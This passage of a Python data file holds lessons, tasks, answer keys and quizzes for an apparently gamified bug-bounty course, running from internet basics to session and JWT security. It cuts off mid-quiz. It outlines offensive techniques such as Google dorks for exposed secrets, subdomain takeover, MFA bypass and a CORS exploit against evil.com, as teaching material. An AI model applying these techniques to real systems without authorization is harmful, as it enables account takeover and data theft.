LEVELS = {
    1: {
        "title": "Internet Basics",
        "subtitle": "Level 1: How the Internet Works",
        "description": "Understand the global network that powers everything — from packets and protocols to IP addresses and infrastructure.",
        "topics": [
            {"name": "What is the Internet?", "content": "The internet is a global network of computers connected by cables, satellites, and wireless signals. Data is broken into packets (like letters), addressed with IPs (like postal addresses), and routed through servers (like post offices).", "emoji": "🌐"},
            {"name": "IP Addresses & Domain Names", "content": "Every device has an IP address (like a phone number). Domain names are human-readable labels (google.com) mapped to IPs via DNS. IPv4 (32-bit) is running out; IPv6 (128-bit) is the future.", "emoji": "📟"},
            {"name": "Packets, Routing & ISPs", "content": "Data travels in packets that may take different routes. Routers direct traffic. ISPs provide connectivity. Traceroute shows the path packets take — useful for understanding network topology.", "emoji": "📦"},
            {"name": "The Client-Server Model", "content": "Clients (browsers, apps) request data. Servers store and serve it. One server can handle millions of clients. This model is the foundation of every web interaction.", "emoji": "💻"},
        ],
        "task": {"title": "Trace a URL", "description": "Break down: https://shop.example.com/products?id=123#reviews\nIdentify: protocol, subdomain, domain, path, query, fragment.", "expected_answer": "Protocol: https, Subdomain: shop, Domain: example.com, Path: /products, Query: id=123, Fragment: #reviews", "xp_reward": 100},
        "interview_prompt": "Explain how a packet travels from your browser to a server and back. What are IP addresses and why do we need DNS?",
        "key_concepts": ["internet", "packet", "ip address", "dns", "client", "server", "router", "isp", "protocol", "ipv4", "ipv6"],
        "quiz": [
            {"q": "What does DNS do?", "opts": ["Sends emails", "Translates domains to IPs", "Encrypts data", "Hosts websites"], "ans": 1},
            {"q": "What is a packet?", "opts": ["A network cable", "A piece of data sent over a network", "A type of server", "A security protocol"], "ans": 1},
            {"q": "In the client-server model, what is a browser?", "opts": ["Server", "Client", "Router", "ISP"], "ans": 1},
        ], "xp_reward": 100
    },
    2: {
        "title": "Web Fundamentals",
        "subtitle": "Level 2: HTML, CSS, JavaScript Basics",
        "description": "Learn the building blocks of every website — structure, style, and behavior — and how they create the pages you see.",
        "topics": [
            {"name": "HTML — The Structure", "content": "HTML (HyperText Markup Language) defines page structure using tags: <div>, <a>, <form>, <input>. Attributes like 'action', 'method', 'onclick' control behavior. Inspecting HTML reveals hidden inputs, comments, and debug info.", "emoji": "📄"},
            {"name": "CSS — The Styling", "content": "CSS controls layout, colors, fonts. Key security angle: CSS injection can steal data via attribute selectors (input[value^='a']). UI redress attacks (clickjacking) use CSS to hide elements.", "emoji": "🎨"},
            {"name": "JavaScript — The Behavior", "content": "JavaScript makes pages interactive. It runs in the browser (client-side). JS can read/modify the DOM, send AJAX requests, access cookies (unless HttpOnly), and handle events. Most client-side vulnerabilities (XSS, DOM clobbering) exploit JS.", "emoji": "⚡"},
            {"name": "How Browsers Render Pages", "content": "Browser downloads HTML → parses into DOM tree → fetches CSS → builds CSSOM → combines into Render Tree → paints pixels. JavaScript blocks parsing until executed. Understanding this helps you find DOM-based XSS.", "emoji": "🖥️"},
        ],
        "task": {"title": "Find Hidden Elements", "description": "Open any website's DevTools (F12). Inspect the HTML. Find: 1) A hidden input field 2) An HTML comment 3) A script tag. Paste what you found.", "expected_answer": "Any real examples from a live site showing hidden inputs, comments, or scripts.", "xp_reward": 100},
        "interview_prompt": "Explain the roles of HTML, CSS, and JavaScript. How do they work together to create a web page?",
        "key_concepts": ["html", "css", "javascript", "dom", "attribute", "script", "render"],
        "quiz": [
            {"q": "What does HTML define?", "opts": ["Page styling", "Page structure", "Page behavior", "Server logic"], "ans": 1},
            {"q": "Where does JavaScript run?", "opts": ["Only on servers", "In the browser", "Only in databases", "On routers"], "ans": 1},
            {"q": "What tool lets you inspect a page's HTML?", "opts": ["Text editor", "Browser DevTools", "Command prompt", "Email client"], "ans": 1},
        ], "xp_reward": 100
    },
    3: {
        "title": "Networking Basics",
        "subtitle": "Level 3: How Data Moves Across Networks",
        "description": "Understand TCP/IP, ports, firewalls, and network layers — essential knowledge for finding network-level vulnerabilities.",
        "topics": [
            {"name": "TCP/IP Protocol Stack", "content": "TCP/IP has 4 layers: Application (HTTP, DNS), Transport (TCP, UDP), Internet (IP), Link (Ethernet, WiFi). Each layer adds headers. TCP guarantees delivery; UDP is faster but lossy. Understanding layers helps you know where vulnerabilities live.", "emoji": "📚"},
            {"name": "Ports & Services", "content": "Ports are numbered doors into a computer: 80 (HTTP), 443 (HTTPS), 22 (SSH), 3306 (MySQL). Open ports = attack surface. Port scanning (nmap) discovers which services are running. Every open port is a potential entry point.", "emoji": "🚪"},
            {"name": "Firewalls & Network Segmentation", "content": "Firewalls filter traffic based on rules (IP, port, protocol). WAFs filter HTTP-level attacks. DMZ separates public-facing servers from internal networks. Misconfigured firewalls and exposed internal services are common findings.", "emoji": "🛡️"},
            {"name": "The OSI Model Reference", "content": "7 layers: Physical, Data Link, Network, Transport, Session, Presentation, Application. Each serves the layer above. Bug bounty hunters focus on Application (Layer 7) and Network (Layer 3) the most.", "emoji": "🗂️"},
        ],
        "task": {"title": "Read a Port Scan", "description": "Given: PORT STATE SERVICE\n22/tcp open ssh\n80/tcp open http\n443/tcp open https\n3306/tcp open mysql\n\nWhich port is most dangerous if exposed to the internet and why?", "expected_answer": "Port 3306 (MySQL). Database ports should never be publicly accessible. An exposed database can be brute-forced or exploited.", "xp_reward": 150},
        "interview_prompt": "Explain the TCP/IP model layers. What is a port and why do open ports matter for security?",
        "key_concepts": ["tcp", "ip", "udp", "port", "firewall", "nmap", "osi", "network", "waf", "dmz"],
        "quiz": [
            {"q": "What port does HTTPS use?", "opts": ["80", "443", "22", "8080"], "ans": 1},
            {"q": "Which protocol guarantees delivery?", "opts": ["UDP", "TCP", "HTTP", "DNS"], "ans": 1},
            {"q": "What tool scans open ports?", "opts": ["curl", "nmap", "ping", "traceroute"], "ans": 1},
        ], "xp_reward": 150
    },
    4: {
        "title": "HTTP Deep Dive",
        "subtitle": "Level 4: The Language of the Web",
        "description": "Master HTTP — the protocol every bug bounty hunter must understand intimately. Requests, responses, headers, and methods.",
        "topics": [
            {"name": "HTTP Methods & Their Meanings", "content": "GET (read), POST (create), PUT (update), PATCH (partial update), DELETE (remove), OPTIONS (discover allowed methods), HEAD (headers only). In bug bounty, test methods on unexpected endpoints — DELETE on a GET-only endpoint reveals misconfiguration.", "emoji": "📮"},
            {"name": "Headers — Request & Response", "content": "Request headers: User-Agent, Accept, Authorization, Cookie, Referer, Content-Type. Response headers: Set-Cookie, Cache-Control, Content-Security-Policy, X-Frame-Options. Missing security headers are reportable findings. Headers like X-Forwarded-For can be spoofed for IP-based bypasses.", "emoji": "🧢"},
            {"name": "HTTP Status Codes", "content": "1xx (info), 2xx (success: 200 OK, 201 Created), 3xx (redirect: 301 moved, 302 found), 4xx (client error: 401 unauthorized, 403 forbidden, 404 not found, 405 method not allowed), 5xx (server error: 500 internal, 502 bad gateway). 403 vs 200 on an admin endpoint — that's an access control issue.", "emoji": "🏷️"},
            {"name": "HTTP/1.1 vs HTTP/2 vs HTTP/3", "content": "HTTP/1.1: text-based, one request per connection. HTTP/2: binary, multiplexed, compressed headers. HTTP/3: over QUIC (UDP), faster connection setup. HTTP/2 downgrade and request smuggling are advanced attack vectors.", "emoji": "⚡"},
            {"name": "Request Smuggling Basics", "content": "When front-end and back-end servers disagree on request boundaries (Content-Length vs Transfer-Encoding), attackers can smuggle requests. This can bypass security controls, poison caches, and hijack user sessions. PortSwigger's James Kettle pioneered this research.", "emoji": "🕵️"},
        ],
        "task": {"title": "Analyze an HTTP Exchange", "description": "Request: POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nCookie: session=abc\n\nBody: user=admin&pass=test\n\nResponse: 302 Found\nSet-Cookie: session=xyz; HttpOnly; Secure\nLocation: /dashboard\n\nWhat happened? What does HttpOnly do? Why 302?", "expected_answer": "Login succeeded → server set new session cookie with HttpOnly (JS can't read) and Secure (only over HTTPS), redirected to dashboard with 302.", "xp_reward": 150},
        "interview_prompt": "Explain HTTP methods, status codes, and the importance of security headers like Content-Security-Policy and cookie flags.",
        "key_concepts": ["http", "get", "post", "put", "delete", "header", "cookie", "status code", "content-type", "csp", "hsts", "smuggling"],
        "quiz": [
            {"q": "Which HTTP method is used to submit form data?", "opts": ["GET", "POST", "DELETE", "OPTIONS"], "ans": 1},
            {"q": "What does status code 403 mean?", "opts": ["Success", "Redirect", "Forbidden", "Server error"], "ans": 2},
            {"q": "Which flag makes a cookie inaccessible to JavaScript?", "opts": ["Secure", "HttpOnly", "SameSite", "Domain"], "ans": 1},
            {"q": "What is HTTP request smuggling?", "opts": ["Stealing cookies", "Exploiting parsing discrepancies", "DNS poisoning", "Port scanning"], "ans": 1},
        ], "xp_reward": 200
    },
    5: {
        "title": "Browser Security Model",
        "subtitle": "Level 5: Same-Origin Policy, CORS & Browser Protections",
        "description": "Browsers have built-in security boundaries. Understanding them is critical — and finding ways they break leads to bounties.",
        "topics": [
            {"name": "Same-Origin Policy (SOP)", "content": "SOP is the browser's most important security rule: a page from origin A cannot read data from origin B. Origin = scheme + host + port. SOP prevents evil.com from reading your bank's response. Without SOP, any site could steal your emails, messages, and cookies.", "emoji": "🚧"},
            {"name": "Cross-Origin Resource Sharing (CORS)", "content": "CORS relaxes SOP selectively. Servers send Access-Control-Allow-Origin headers to permit cross-origin requests. Misconfigured CORS (ACAO: *, reflecting Origin, allowing credentials) lets attackers read sensitive data cross-origin. This is a common and lucrative finding.", "emoji": "🔗"},
            {"name": "Content Security Policy (CSP)", "content": "CSP restricts what resources can load: scripts, styles, images, fonts, frames. A strong CSP prevents XSS even if an injection point exists. Directives: script-src, style-src, img-src, frame-ancestors. Report-URI sends violation reports. CSP bypass techniques are advanced bug bounty hunts.", "emoji": "📜"},
            {"name": "Iframe Sandboxing & Framing Protections", "content": "X-Frame-Options: DENY blocks all iframing. frame-ancestors in CSP is the modern replacement. Clickjacking attacks overlay transparent iframes. Sandbox attribute on iframes restricts what embedded content can do. Missing frame protections = clickjacking vulnerability.", "emoji": "🖼️"},
        ],
        "task": {"title": "CORS Misconfiguration Lab", "description": "A site returns: Access-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true\n\nExplain why this is dangerous and how an attacker would exploit it.", "expected_answer": "The server trusts arbitrary origins (reflecting the request Origin) and allows credentials. Attacker creates a page on evil.com that fetches victim's bank data with credentials. The browser allows the cross-origin read — full account takeover.", "xp_reward": 200},
        "interview_prompt": "What is Same-Origin Policy and why does it exist? How can misconfigured CORS be exploited?",
        "key_concepts": ["sop", "cors", "origin", "csp", "x-frame-options", "clickjacking", "sandbox", "cross-origin"],
        "quiz": [
            {"q": "What three things define an origin?", "opts": ["Protocol, domain, port", "Domain, path, query", "IP, MAC, port", "User, password, token"], "ans": 0},
            {"q": "Which header relaxes Same-Origin Policy?", "opts": ["Set-Cookie", "Access-Control-Allow-Origin", "X-Frame-Options", "Content-Type"], "ans": 1},
            {"q": "What does CSP protect against?", "opts": ["SQL injection", "XSS", "CSRF", "SSRF"], "ans": 1},
        ], "xp_reward": 200
    },
    6: {
        "title": "Cybersecurity & Bug Bounty Introduction",
        "subtitle": "Level 6: Enter the World of Ethical Hacking",
        "description": "What is bug bounty hunting, how platforms work, ethics, legal boundaries, and the hunter mindset.",
        "topics": [
            {"name": "What is Bug Bounty?", "content": "Companies invite security researchers to find vulnerabilities and pay them for valid reports. Programs on HackerOne, Bugcrowd, and Intigriti offer rewards from $50 to $100,000+. It's ethical hacking with a reward system.", "emoji": "💰"},
            {"name": "Types of Bug Bounty Programs", "content": "Public: anyone can join (HackerOne, Bugcrowd). Private: invite-only via platform. VDP (Vulnerability Disclosure Program): no monetary reward, only recognition. Self-managed: company runs its own program. Start with VDPs to learn reporting.", "emoji": "📋"},
            {"name": "Legal & Ethical Boundaries", "content": "Only test what's in scope. Never test without authorization. No data exfiltration beyond POC. No DoS attacks. Disclose privately. Follow responsible disclosure timelines. Violating these gets you banned — or sued.", "emoji": "⚖️"},
            {"name": "The Hunter Mindset", "content": "Think like an attacker: 'What would break this?' Be curious, methodical, patient. Most bugs come from understanding the application deeply, not from automated scanners. Document everything. Learn from every report — accepted or rejected.", "emoji": "🧠"},
        ],
        "task": {"title": "Read a Bug Bounty Program's Scope", "description": "Go to HackerOne or Bugcrowd, find a public program, read their scope. Write down: 1) What's in scope 2) What's out of scope 3) Reward range 4) Any special rules.", "expected_answer": "Any real program scope analysis from a live program.", "xp_reward": 100},
        "interview_prompt": "What is bug bounty hunting? Explain the difference between public and private programs, and why ethical boundaries matter.",
        "key_concepts": ["bug bounty", "hackerone", "bugcrowd", "responsible disclosure", "scope", "vdp", "ethics", "hacker mindset"],
        "quiz": [
            {"q": "What does VDP stand for?", "opts": ["Vulnerability Detection Program", "Vulnerability Disclosure Program", "Verified Defense Protocol", "Virtual Data Protection"], "ans": 1},
            {"q": "Which is a bug bounty platform?", "opts": ["GitHub", "HackerOne", "StackOverflow", "AWS"], "ans": 1},
            {"q": "Should you test features outside scope?", "opts": ["Yes, if you find something critical", "No, never", "Only if the program is public", "After you submit a report"], "ans": 1},
        ], "xp_reward": 100
    },
    7: {
        "title": "Reconnaissance Basics",
        "subtitle": "Level 7: Information Gathering",
        "description": "Recon is 80% of bug bounty. Learn passive techniques to discover target assets without touching their servers.",
        "topics": [
            {"name": "Passive vs Active Recon", "content": "Passive: gather info without interacting (search engines, certificate logs, DNS records). Active: directly probe the target (port scans, directory brute-force). Always start passive. Passive leaves no traces; active can trigger alarms.", "emoji": "🔍"},
            {"name": "Google Dorking", "content": "Advanced Google searches: site:target.com, intitle:login, inurl:admin, filetype:xls, ext:env, intext:password. Google dorks reveal exposed documents, login pages, configuration files, and forgotten subdomains. The Google Hacking Database (GHDB) has thousands of dorks.", "emoji": "🔎"},
            {"name": "Wayback Machine & Historical Data", "content": "archive.org captures website snapshots. Old versions may reveal: removed endpoints, exposed API keys in JS files, deprecated pages still accessible, comments with credentials. Compare old vs new to find removed-but-accessible features.", "emoji": "📜"},
            {"name": "WHOIS & ASN Lookups", "content": "WHOIS reveals domain registration details (registrant, dates, nameservers). ASN (Autonomous System Number) identifies all IP ranges owned by an organization. Tools: whois, BGP.he.net. Finding all IP ranges = finding all attack surface.", "emoji": "📇"},
        ],
        "task": {"title": "Google Dork Discovery", "description": "Use the dork: site:example.com intitle:index.of\nFind a directory listing page. What did it reveal?", "expected_answer": "Any directory listing found via Google dorking on a target domain.", "xp_reward": 150},
        "interview_prompt": "Explain the difference between passive and active reconnaissance. What are Google dorks and how do you use the Wayback Machine for recon?",
        "key_concepts": ["recon", "passive recon", "active recon", "google dork", "wayback machine", "whois", "asn", "osint"],
        "quiz": [
            {"q": "What type of recon leaves traces on the target's servers?", "opts": ["Passive", "Active", "OSINT", "Google dorking"], "ans": 1},
            {"q": "Which site archives historical web pages?", "opts": ["Google Search", "Wayback Machine", "Shodan", "GitHub"], "ans": 1},
            {"q": "What does a WHOIS lookup reveal?", "opts": ["Server passwords", "Domain registration details", "Source code", "Database contents"], "ans": 1},
        ], "xp_reward": 150
    },
    8: {
        "title": "DNS & Subdomain Enumeration",
        "subtitle": "Level 8: Mapping the Domain Landscape",
        "description": "Subdomains reveal hidden attack surface. Every subdomain is a potential entry point. Learn to find them all.",
        "topics": [
            {"name": "DNS Record Types Explained", "content": "A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail server), NS (name server), TXT (arbitrary text), SOA (zone authority). TXT records often contain security verification strings. CNAME records tell you which services are used — and which might be vulnerable to takeover.", "emoji": "📡"},
            {"name": "Certificate Transparency (CRT)", "content": "Every SSL certificate issued is logged in CT logs. Search crt.sh for any domain to see all certificates ever issued — revealing subdomains. This is the single best subdomain discovery technique. Wildcard certificates (*.example.com) show all subdomains at once.", "emoji": "📜"},
            {"name": "DNS Brute-Forcing & Wordlists", "content": "Try common subdomain names against the target's DNS: admin, mail, dev, staging, api, test, blog, cdn, beta, vpn. Tools: ffuf, gobuster, dnsrecon. Wordlists: SecLists, Assetnote's 2m-subdomains. More requests = more findings.", "emoji": "🔨"},
            {"name": "Subdomain Takeover", "content": "When a CNAME points to a service (AWS S3, Heroku, GitHub Pages, Azure) that no longer exists, you can register it and take over the subdomain. Impact: full control of subdomain, ability to host malicious content, steal cookies. Check: can-i-take-over-xyz.github.io.", "emoji": "🚩"},
        ],
        "task": {"title": "Find Subdomains via CRT.sh", "description": "Go to crt.sh and search for a target domain. List 5 subdomains found. Check if any of the CNAME records point to a third-party service.", "expected_answer": "5 real subdomains from crt.sh search with CNAME analysis.", "xp_reward": 200},
        "interview_prompt": "How do you find subdomains using Certificate Transparency logs? What is subdomain takeover and how does it work?",
        "key_concepts": ["dns", "subdomain", "crt.sh", "certificate transparency", "cname", "takeover", "dns brute", "wordlist"],
        "quiz": [
            {"q": "What DNS record type maps a domain to an alias?", "opts": ["A", "MX", "CNAME", "TXT"], "ans": 2},
            {"q": "Which website queries Certificate Transparency logs?", "opts": ["shodan.io", "crt.sh", "dns.google", "who.is"], "ans": 1},
            {"q": "What is subdomain takeover?", "opts": ["Stealing DNS records", "Registering an unclaimed CNAME target", "Brute-forcing subdomains", "DNS cache poisoning"], "ans": 1},
        ], "xp_reward": 200
    },
    9: {
        "title": "Asset Discovery & Target Mapping",
        "subtitle": "Level 9: Finding Every Piece of the Target",
        "description": "You can't hack what you can't find. Learn systematic asset discovery to map the complete attack surface.",
        "topics": [
            {"name": "Identifying All Company Domains", "content": "Companies own multiple domains. Find them via: WHOIS (same registrant), reverse DNS, similar domains (typosquatting), acquisition history, job postings (careers.example.io), Google Analytics IDs shared across properties. Group domains by ASN.", "emoji": "🏢"},
            {"name": "Technology Stack Detection", "content": "Identify: web server (Apache, Nginx), framework (Django, Rails, React), CMS (WordPress, Drupal), CDN (Cloudflare, Akamai), analytics, hosting provider. Tools: WhatWeb, Wappalyzer, BuiltWith. Each technology has known CVEs and misconfigurations to test.", "emoji": "🔬"},
            {"name": "Finding Hidden Endpoints", "content": "Parse JavaScript files for API routes. Check robots.txt, sitemap.xml, .well-known/, Swagger docs, GraphQL playground. Use crawlers (gospider, hakrawler) and brute-force (ffuf, dirsearch). Hidden endpoints often lack authentication.", "emoji": "🔗"},
            {"name": "Cloud Asset Discovery", "content": "Find S3 buckets (bucketname.s3.amazonaws.com), Firebase databases, Azure Blob storage, Google Cloud Storage. Tools: cloud_enum, S3Scanner, GCPBucketBrute. Unsecured cloud storage leaks millions of records — consistently a top HackerOne finding.", "emoji": "☁️"},
        ],
        "task": {"title": "Technology Audit", "description": "Pick a target. Use Wappalyzer or WhatWeb. List: web server, framework, CMS (if any), CDN, analytics, hosting provider. Which tools would you use for each?", "expected_answer": "Complete tech stack audit of a chosen target with methodology.", "xp_reward": 200},
        "interview_prompt": "How do you discover all assets owned by a company? What tools help detect technologies and hidden endpoints?",
        "key_concepts": ["asset discovery", "tech stack", "wappalyzer", "endpoint", "cloud storage", "s3 bucket", "crawl", "ffuf"],
        "quiz": [
            {"q": "Which file often contains hidden API endpoints?", "opts": ["style.css", "app.js", "index.html", "favicon.ico"], "ans": 1},
            {"q": "What tool detects a website's technology stack?", "opts": ["nmap", "Wappalyzer", "sqlmap", "Burp Suite"], "ans": 1},
            {"q": "Where do S3 bucket URLs typically follow this pattern?", "opts": ["bucket.s3.amazonaws.com", "s3.bucket.com", "aws.bucket.io", "s3.amazon.com/bucket"], "ans": 0},
        ], "xp_reward": 200
    },
    10: {
        "title": "Web Application Mapping",
        "subtitle": "Level 10: Understanding Application Structure",
        "description": "Map the application's routes, parameters, and data flow to understand how it works and where it breaks.",
        "topics": [
            {"name": "URL Structure & Parameters", "content": "Parameters come in different forms: query string (?id=1), path parameters (/user/123), POST body, JSON/XML payloads, headers, cookies. Test every parameter for injection, manipulation, and missing validation. Hidden parameters can unlock hidden functionality.", "emoji": "🔗"},
            {"name": "API Endpoint Discovery", "content": "Modern apps are API-driven. Find endpoints via: JavaScript analysis (LinkFinder), Swagger docs (/api/docs, /swagger.json), GraphQL introspection, common patterns (/api/v1/, /graphql, /rest/). Test each discovered endpoint for auth bypass, IDOR, and injection.", "emoji": "🔀"},
            {"name": "Authentication & Authorization Flow Mapping", "content": "Map the login, registration, password reset, MFA, and logout flows. Identify: where tokens are stored (cookie, localStorage), how they're transmitted, how the server validates them, what happens after expiry. Weak links in the auth chain are high-value targets.", "emoji": "🗺️"},
            {"name": "State Changes & CSRF Tokens", "content": "Identify every state-changing endpoint (POST, PUT, DELETE, PATCH). Check if they require CSRF tokens, custom headers, or are protected by SameSite cookies. State-changing GET requests are an immediate finding. CSRF-protected but not on all endpoints is also reportable.", "emoji": "🔄"},
        ],
        "task": {"title": "Map an Application Flow", "description": "Pick a web app. Using browser DevTools, map: 1) All API calls made on page load, 2) Authentication flow endpoints, 3) Any state-changing operations. Document each endpoint's method, parameters, and required auth.", "expected_answer": "Complete API flow map of a real web application.", "xp_reward": 250},
        "interview_prompt": "How do you discover API endpoints and map an application's authentication flow? What are you looking for?",
        "key_concepts": ["api", "endpoint", "parameter", "router", "swagger", "graphql", "auth flow", "state change"],
        "quiz": [
            {"q": "Where do query string parameters appear?", "opts": ["In the URL after ?", "In the request body", "In cookies", "In response headers"], "ans": 0},
            {"q": "What is GraphQL introspection?", "opts": ["A caching mechanism", "A query that reveals the full API schema", "A database optimization", "A security header"], "ans": 1},
            {"q": "State-changing operations should use which HTTP methods?", "opts": ["GET, HEAD", "POST, PUT, DELETE, PATCH", "OPTIONS, TRACE", "All methods equally"], "ans": 1},
        ], "xp_reward": 250
    },
    11: {
        "title": "Automation Basics for Recon",
        "subtitle": "Level 11: Work Smarter, Not Harder",
        "description": "Manual recon is slow. Learn to automate the tedious parts so you can focus on finding bugs.",
        "topics": [
            {"name": "Why Automate Recon?", "content": "A target may have thousands of subdomains, millions of parameters, hundreds of endpoints. Manual testing misses things. Automation: 1) Discovers what manual effort misses, 2) Runs 24/7, 3) Produces repeatable results, 4) Frees time for deep manual testing.", "emoji": "🤖"},
            {"name": "Building a Recon Pipeline", "content": "Tool chain: subdomains (subfinder, amass) → resolve (httpx) → screenshot (gowitness) → crawl (gospider) → JS parse (LinkFinder) → parameter find → vulnerability scan. Chain tools with pipes and bash scripts. Store results in organized directories.", "emoji": "⚙️"},
            {"name": "Using ffuf for Mass Discovery", "content": "ffuf is the fastest web fuzzer. Uses: directory brute-force, subdomain brute-force, parameter fuzzing, POST body fuzzing, header fuzzing. Key flags: -w wordlist, -u target, -H headers, -fc (filter status), -fs (filter size). Always filter noise.", "emoji": "🔧"},
            {"name": "Webhooks & Notifications", "content": "Set up notifications for recon results. Use Discord/Slack webhooks, Telegram bots, or email. When automation finds something new (subdomain, endpoint), get alerted instantly. Tools: notify, discord.sh. Real-time alerts keep you ahead of other hunters.", "emoji": "🔔"},
        ],
        "task": {"title": "Build a Simple Recon Script", "description": "Write a bash/Python script that: 1) Takes a domain as input, 2) Runs subfinder for subdomains, 3) Runs httpx to check alive, 4) Saves results to a file with timestamp.", "expected_answer": "Working recon script that outputs subdomains sorted by status.", "xp_reward": 250},
        "interview_prompt": "Why automate reconnaissance? What does a basic recon pipeline look like and what tools would you include?",
        "key_concepts": ["automation", "recon pipeline", "ffuf", "subfinder", "httpx", "gospider", "bash scripting"],
        "quiz": [
            {"q": "What is the primary benefit of automating recon?", "opts": ["It's more accurate than manual", "Discovers what manual effort misses", "Requires no configuration", "Is legally safer"], "ans": 1},
            {"q": "Which tool is fastest for web fuzzing?", "opts": ["gobuster", "ffuf", "dirb", "nmap"], "ans": 1},
            {"q": "What does httpx do?", "opts": ["HTTP proxy", "Checks if hosts are alive", "Parses JavaScript", "Scans for XSS"], "ans": 1},
        ], "xp_reward": 250
    },
    12: {
        "title": "Hacker Thinking & Target Analysis",
        "subtitle": "Level 12: Think Like an Attacker",
        "description": "Technical skills alone don't find bugs. Develop the mindset to see what others miss.",
        "topics": [
            {"name": "The Hacker Mindset", "content": "Question everything: 'What if...?' What if I send negative numbers? What if I skip this step? What if I use a different user's session? What if I modify this parameter? Curiosity drives discovery. The best hunters are relentlessly curious about how things work — and break.", "emoji": "💭"},
            {"name": "Prioritization: What to Test First", "content": "Not all features are equal. Prioritize: 1) Authentication & authorization, 2) Financial transactions, 3) User data handling (PII), 4) File uploads, 5) Input reflection points. Follow the data — where sensitive information flows, bugs are most valuable.", "emoji": "🎯"},
            {"name": "Reading Documentation with a Hacker Eye", "content": "API docs, feature announcements, changelogs, and security advisories reveal what's new. New features = new bugs. Read between the lines: 'This field should only be modifiable by admins' → test if non-admins can modify it. Documentation lies.", "emoji": "📖"},
            {"name": "Edge Cases & Negative Testing", "content": "Test boundaries: zero, negative numbers, max values, special characters, null bytes, Unicode, empty strings, arrays instead of strings, duplicate keys. Every parser handles edge cases differently. Business logic bugs often live in the edge cases.", "emoji": "🔲"},
        ],
        "task": {"title": "Think of 10 'What If' Questions", "description": "Pick a common feature (e.g., password reset, shopping cart, file upload). Write 10 'What if...' test cases for that feature. Example: 'What if I change the user_id parameter to another user's ID?'", "expected_answer": "10 creative attack scenarios for a chosen feature.", "xp_reward": 200},
        "interview_prompt": "What is the hacker mindset? How do you prioritize what to test and find edge cases others miss?",
        "key_concepts": ["hacker mindset", "curiosity", "prioritization", "edge case", "negative testing", "business logic"],
        "quiz": [
            {"q": "Which features should you prioritize testing?", "opts": ["Static pages", "Authentication & auth flows", "Footer links", "Logo images"], "ans": 1},
            {"q": "What does testing with '-1' or '99999' check for?", "opts": ["SQL injection", "Edge case handling", "XSS", "Server version"], "ans": 1},
            {"q": "Why read API documentation as a hacker?", "opts": ["To use the API correctly", "To find features that may be exploitable", "To learn programming", "To find server addresses"], "ans": 1},
        ], "xp_reward": 200
    },
    13: {
        "title": "Authentication Systems",
        "subtitle": "Level 13: Breaking Into Apps",
        "description": "Authentication is the first line of defense. Find flaws in login, registration, password reset, and MFA.",
        "topics": [
            {"name": "Common Authentication Flaws", "content": "Username enumeration (different error messages), brute force (no rate limiting), weak password policies, credential stuffing (no breach detection), session fixation (same session before/after login). Every flaw is a potential account takeover chain.", "emoji": "🔓"},
            {"name": "Password Reset Vulnerabilities", "content": "Reset tokens are often predictable: sequential numbers, timestamps, user IDs, MD5(email). Token sent over HTTP, token not invalidated after use, token valid forever. Check: is the reset link emailed to a verified address? Can you change whose email receives it?", "emoji": "🔄"},
            {"name": "MFA & 2FA Bypass Techniques", "content": "MFA bypasses: brute force codes (no rate limit), session reuse after MFA step, OAuth token not bound to session, backup codes not invalidated, MFA not required for API endpoints, SMS interception. Test if MFA is actually enforced on all sensitive operations.", "emoji": "🔐"},
            {"name": "OAuth 2.0 Security Issues", "content": "OAuth flaws: open redirect in redirect_uri, no state parameter (CSRF on auth flow), token leakage via Referer, code injection via open redirect, improper scope validation. Many modern apps use OAuth — and many implement it incorrectly.", "emoji": "🔑"},
        ],
        "task": {"title": "Test Password Reset", "description": "Pick a site and test the password reset flow. Document: 1) Is the reset token in the URL? 2) How many characters? 3) Does it look random or predictable? 4) Can you reuse it? 5) Is there rate limiting?", "expected_answer": "Security assessment of a password reset flow with findings.", "xp_reward": 250},
        "interview_prompt": "What are the most common authentication vulnerabilities? How do you test for password reset flaws and MFA bypasses?",
        "key_concepts": ["authentication", "login", "password reset", "mfa", "2fa", "oauth", "brute force", "credential stuffing", "token"],
        "quiz": [
            {"q": "What is username enumeration?", "opts": ["Guessing passwords", "Different responses reveal valid usernames", "Listing all users", "SQL injection on usernames"], "ans": 1},
            {"q": "Which OAuth parameter prevents CSRF?", "opts": ["client_id", "state", "redirect_uri", "scope"], "ans": 1},
            {"q": "What makes a password reset token insecure?", "opts": ["Being 32 characters long", "Being based on timestamp", "Using HTTPS", "Expiring in 1 hour"], "ans": 1},
        ], "xp_reward": 250
    },
    14: {
        "title": "Session Management & Cookies",
        "subtitle": "Level 14: Keeping Users Logged In — Securely",
        "description": "Sessions are how apps remember you. Flawed session management means attackers can impersonate anyone.",
        "topics": [
            {"name": "How Session Management Works", "content": "After login, server creates a session and sends a session ID to the browser via cookie. Browser sends cookie with every request. Server looks up session store to identify the user. Weakness: predictable IDs, no invalidation on logout, long expiry, missing Secure/HttpOnly flags.", "emoji": "🍪"},
            {"name": "Session Attacks & Defenses", "content": "Session hijacking (steal cookie via XSS or network), session fixation (attacker sets ID before login), session prediction (weak random generation). Defenses: HttpOnly, Secure, SameSite flags; regenerate session on login; short expiry; bind to IP/User-Agent.", "emoji": "🛡️"},
            {"name": "JWT Deep Dive", "content": "JWT = JSON Web Token. Three base64 parts: header (algorithm), payload (data), signature (verification). Vulnerabilities: 'none' algorithm, weak HMAC secret, algorithm confusion (RS256→HS256), JWK injection, KID path traversal, expired tokens accepted. Tools: jwt_tool, jwt.io.", "emoji": "🔖"},
            {"name": "Cookie Attributes Explained", "content": "Secure: only sent over HTTPS. HttpOnly: inaccessible to JavaScript (prevents XSS theft). SameSite: Strict (same-site only), Lax (top-level GET allowed), None (cross-site, requires Secure). Domain/Path: controls scope. Missing = vulnerable.", "emoji": "🏷️"},
        ],
        "task": {"title": "Cookie Security Audit", "description": "Use browser DevTools → Application → Cookies. For a logged-in site, document each cookie's: name, value (masked), Secure flag, HttpOnly flag, SameSite value, Domain, Path, Expiry. Identify any misconfigurations.", "expected_answer": "Complete cookie security audit with findings.", "xp_reward": 250},
        "interview_prompt": "How do web sessions work? What are JWT vulnerabilities and how do cookie attributes like HttpOnly and SameSite protect against attacks?",
        "key_concepts": ["session", "cookie", "jwt", "token", "httponly", "secure", "samesite", "session hijacking", "session fixation"],
        "quiz": [
            {"q": "What does HttpOnly cookie flag prevent?", "opts": ["Network sniffing", "JavaScript access", "Man-in-the-middle attacks", "CSRF"], "ans": 1},
